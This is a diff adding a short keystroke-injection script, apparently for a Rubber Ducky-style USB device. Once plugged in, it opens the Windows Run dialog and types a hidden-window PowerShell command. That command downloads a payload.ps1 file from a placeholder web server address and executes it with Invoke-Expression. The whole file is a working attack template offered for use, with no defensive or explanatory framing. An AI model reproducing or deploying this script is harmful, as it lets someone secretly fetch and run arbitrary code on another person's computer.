@@ -1,0 +1,8 @@
+REM Author: H3ll0Wolrd
+REM Description: I'm too lazy to put something here :)
+REM Requirements: Put the Web Server Address in the code WHITOUT the last'/'
+
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -W H Invoke-Expression (New-Object Net.WebClient).DownloadString('PUT_HERE_THE_WEB_SERVER_ADDRESS/payload.ps1'); x PUT_HERE_THE_WEB_SERVER_ADDRESS
